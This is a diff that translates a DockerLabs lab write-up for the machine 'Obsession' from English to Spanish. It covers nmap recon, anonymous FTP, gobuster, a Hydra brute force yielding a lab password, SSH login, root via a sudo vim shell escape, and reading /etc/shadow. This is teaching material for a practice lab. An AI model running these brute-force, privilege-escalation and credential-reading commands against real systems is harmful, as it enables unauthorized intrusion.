@@ -1,135 +1,135 @@
 # Obsession – Attack Path Analysis: FTP, SSH and Privilege Escalation
 
-**Researcher:** Ackerman
-**Platform:** DockerLabs
-**Difficulty:** Easy
-**Target IP:** 172.17.0.2
+**Investigador:** Ackerman  
+**Plataforma:** DockerLabs  
+**Dificultad:** Fácil  
+**IP objetivo:** 172.17.0.2
 
 ---
 
-## Table of Contents
+## Tabla de Contenidos
 
-- [Description](#description)
-- [Attack Tools](#attack-tools)
-- [Reconnaissance](#reconnaissance)
-- [FTP Enumeration](#ftp-enumeration)
-- [Web Enumeration](#web-enumeration)
-- [Credential Bruteforce](#credential-bruteforce)
-- [File Analysis](#file-analysis)
-- [Initial Access](#initial-access)
-- [Local Enumeration](#local-enumeration)
-- [Privilege Escalation](#privilege-escalation)
-- [Post Exploitation](#post-exploitation)
+- [Descripción](#descripción)
+- [Herramientas Usadas](#herramientas-usadas)
+- [Reconocimiento](#reconocimiento)
+- [Enumeración FTP](#enumeración-ftp)
+- [Enumeración Web](#enumeración-web)
+- [Fuerza Bruta de Credenciales](#fuerza-bruta-de-credenciales)
+- [Análisis de Archivos](#análisis-de-archivos)
+- [Acceso Inicial](#acceso-inicial)
+- [Enumeración Local](#enumeración-local)
+- [Escalada de Privilegios](#escalada-de-privilegios)
+- [Post Explotación](#post-explotación)
 - [Loot](#loot)
-- [Attack Chain](#attack-chain)
+- [Cadena de Ataque](#cadena-de-ataque)
 
 ---
 
-## Description
+## Descripción
 
-A machine focused on **service enumeration**, **initial access via brute force**, and **privilege escalation** through a sudo misconfiguration. The path chains together anonymous FTP disclosure, web content discovery, credential bruteforcing, and a classic GTFOBins-style privilege escalation via `vim`.
+Máquina enfocada en **enumeración de servicios**, **acceso inicial mediante fuerza bruta** y **escalada de privilegios** a través de una mala configuración en sudo. La ruta de ataque combina divulgación de información vía FTP anónimo, descubrimiento de contenido web, fuerza bruta de credenciales y una escalada de privilegios clásica de estilo GTFOBins mediante `vim`.
 
 ---
 
-## Attack Tools
+## Herramientas Usadas
 
-| Tool | Purpose |
+| Herramienta | Propósito |
 |---|---|
-| **Nmap** | Port & service scanning |
-| **Gobuster** | Web directory enumeration |
-| **Hydra** | Credential bruteforcing |
-| **FTP Client** | File transfer / enumeration |
-| **OpenSSH** | Remote access |
-| **ExifTool** | Metadata / steganography analysis |
-| **Vim** | Privilege escalation vector |
-| **SecLists** | Wordlists |
+| **Nmap** | Escaneo de puertos y servicios |
+| **Gobuster** | Enumeración de directorios web |
+| **Hydra** | Fuerza bruta de credenciales |
+| **Cliente FTP** | Transferencia y enumeración de archivos |
+| **OpenSSH** | Acceso remoto |
+| **ExifTool** | Análisis de metadatos / esteganografía |
+| **Vim** | Vector de escalada de privilegios |
+| **SecLists** | Diccionarios / wordlists |
 
 ---
 
-## Reconnaissance
+## Reconocimiento
 
-Initial full port scan:
+Escaneo inicial de todos los puertos:
 
 ```bash
 nmap -sV -sC -p- 172.17.0.2
 ```
 
-<!-- ![Nmap scan results](screenshots/01-nmap-scan.png) -->
+<!-- ![Resultado de escaneo Nmap](screenshots/01-nmap-scan.png) -->
 
-**Open services:**
+**Servicios abiertos:**
 
-| Port | Service | Version |
+| Puerto | Servicio | Versión |
 |---|---|---|
 | 21/tcp | FTP | vsftpd 3.0.5 |
 | 22/tcp | SSH | OpenSSH 9.6p1 |
 | 80/tcp | HTTP | Apache 2.4.58 |
 
-> ⚠️ Anonymous FTP access was enabled — first point of entry.
+> Se detectó acceso FTP anónimo habilitado — primer punto de entrada.
 
 ---
 
-## FTP Enumeration
+## Enumeración FTP
 
-Anonymous login:
+Login anónimo:
 
 ```bash
 ftp 172.17.0.2
 ```
 
-<!-- ![Anonymous FTP login](screenshots/02-ftp-anon-login.png) -->
+<!-- ![Login FTP anónimo](screenshots/02-ftp-anon-login.png) -->
 
-Listing files:
+Listado de archivos:
 
 ```bash
 ls
 ```
 
-**Files found:**
+**Archivos encontrados:**
 - `chat-gonza.txt`
 - `pendientes.txt`
 
-Downloading:
+Descarga:
 
 ```bash
 get chat-gonza.txt
 get pendientes.txt
 ```
 
-<!-- ![FTP files downloaded](screenshots/03-ftp-files.png) -->
+<!-- ![Archivos FTP descargados](screenshots/03-ftp-files.png) -->
 
-**Key findings:**
-- Username identified: **`russoski`**
-- Internal notes referencing insecure permissions
+**Hallazgos clave:**
+- Usuario identificado: **`russoski`**
+- Notas internas que hacen referencia a permisos inseguros
 
 ---
 
-## Web Enumeration
+## Enumeración Web
 
-Directory brute-forcing:
+Fuerza bruta de directorios:
 
 ```bash
 gobuster dir -u http://172.17.0.2 -w /opt/SecLists/Discovery/Web-Content/common.txt
 ```
 
-<!-- ![Gobuster results](screenshots/04-gobuster.png) -->
+<!-- ![Resultado de Gobuster](screenshots/04-gobuster.png) -->
 
-**Interesting paths found:**
+**Rutas interesantes encontradas:**
 - `/backup`
 - `/important`
 
 ---
 
-## Credential Bruteforce
+## Fuerza Bruta de Credenciales
 
-Bruteforce against FTP using the identified username:
+Ataque de fuerza bruta contra FTP usando el usuario identificado:
 
 ```bash
 hydra -l russoski -P /opt/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt ftp://172.17.0.2
 ```
 
-<!-- ![Hydra bruteforce success](screenshots/05-hydra.png) -->
+<!-- ![Hydra encuentra credenciales](screenshots/05-hydra.png) -->
 
-**Credentials found:**
+**Credenciales encontradas:**
 
 ```text
 russoski:iloveme
@@ -137,9 +137,9 @@ russoski:iloveme
 
 ---
 
-## File Analysis
+## Análisis de Archivos
 
-Authenticated FTP session reveals more directories:
+La sesión FTP autenticada revela más directorios:
 
 ```bash
 cd Documentos
@@ -148,14 +148,14 @@ cd ../Proyectos
 ls
 ```
 
-<!-- ![Authenticated FTP file listing](screenshots/06-ftp-authenticated.png) -->
+<!-- ![Listado de archivos FTP autenticado](screenshots/06-ftp-authenticated.png) -->
 
-**Files found:**
+**Archivos encontrados:**
 - `Nikola Tesla.jpg`
 - `README.md`
 - `Strong-Credentials.py`
 
-Download:
+Descarga:
 
 ```bash
 get "Nikola Tesla.jpg"
@@ -163,7 +163,7 @@ get README.md
 get Strong-Credentials.py
 ```
 
-Analysis:
+Análisis:
 
 ```bash
 strings "Nikola Tesla.jpg"
@@ -172,27 +172,27 @@ cat README.md
 cat Strong-Credentials.py
 ```
 
-<!-- ![Exiftool metadata analysis](screenshots/07-exiftool.png) -->
+<!-- ![Análisis de metadatos con Exiftool](screenshots/07-exiftool.png) -->
 
 ---
 
-## Initial Access
+## Acceso Inicial
 
-SSH login with the credentials obtained:
+Login SSH con las credenciales obtenidas:
 
 ```bash
 ssh russoski@172.17.0.2
 ```
 
-<!-- ![SSH login success](screenshots/08-ssh-login.png) -->
+<!-- ![Login SSH exitoso](screenshots/08-ssh-login.png) -->
 
-Successful authentication as **`russoski`**.
+Autenticación exitosa como **`russoski`**.
 
 ---
 
-## Local Enumeration
+## Enumeración Local
 
-Basic post-access checks:
+Verificaciones básicas post-acceso:
 
 ```bash
 whoami
@@ -201,9 +201,9 @@ hostname
 sudo -l
 ```
 
-<!-- ![Sudo permissions check](screenshots/09-sudo-l.png) -->
+<!-- ![Verificación de permisos sudo](screenshots/09-sudo-l.png) -->
 
-**Sudo misconfiguration found:**
+**Mala configuración de sudo encontrada:**
 
 ```text
 (root) NOPASSWD: /usr/bin/vim
@@ -211,24 +211,24 @@ sudo -l
 
 ---
 
-## Privilege Escalation
+## Escalada de Privilegios
 
-Escalating privileges by spawning a shell from `vim`:
+Escalada de privilegios generando una shell desde `vim`:
 
 ```bash
 sudo vim -c ':!/bin/bash'
 ```
 
-<!-- ![Privilege escalation via vim](screenshots/10-privesc-vim.png) -->
+<!-- ![Escalada de privilegios vía vim](screenshots/10-privesc-vim.png) -->
 
-Verification:
+Verificación:
 
 ```bash
 whoami
 id
 ```
 
-**Root access confirmed:**
+**Acceso root confirmado:**
 
 ```text
 root
@@ -237,9 +237,9 @@ uid=0(root) gid=0(root)
 
 ---
 
-## Post Exploitation
+## Post Explotación
 
-Searching for sensitive files:
+Búsqueda de archivos sensibles:
 
 ```bash
 find / -name "*.txt" 2>/dev/null
@@ -248,15 +248,15 @@ cat /root/*
 cat /etc/shadow
 ```
 
-<!-- ![Root filesystem enumeration](screenshots/11-post-exploitation.png) -->
+<!-- ![Enumeración del sistema de archivos root](screenshots/11-post-exploitation.png) -->
 
-**Findings:**
+**Hallazgos:**
 - `Video-Nagore-Fernandez.txt`
 - `.root-passwd.txt`
 - `backup.txt`
 - `/etc/shadow`
 
-Hidden URL discovered:
+URL oculta descubierta:
 
 ```text
 https://www.youtube.com/shorts/_v8GzGReTAk
@@ -266,7 +266,7 @@ https://www.youtube.com/shorts/_v8GzGReTAk
 
 ## Loot
 
-All collected artifacts are stored in [`loot/`](loot/):
+Todos los artefactos recolectados se encuentran en [`loot/`](loot/):
 
 - `chat-gonza.txt`
 - `pendientes.txt`
@@ -278,8 +278,8 @@ All collected artifacts are stored in [`loot/`](loot/):
 
 ---
 
-## Attack Chain
+## Cadena de Ataque
 
 ```text
-Recon → FTP Enum → Information Disclosure → Gobuster → Hydra → SSH → Sudo Abuse → Root
+Recon → Enum FTP → Divulgación de Información → Gobuster → Hydra → SSH → Abuso de Sudo → Root
 ```
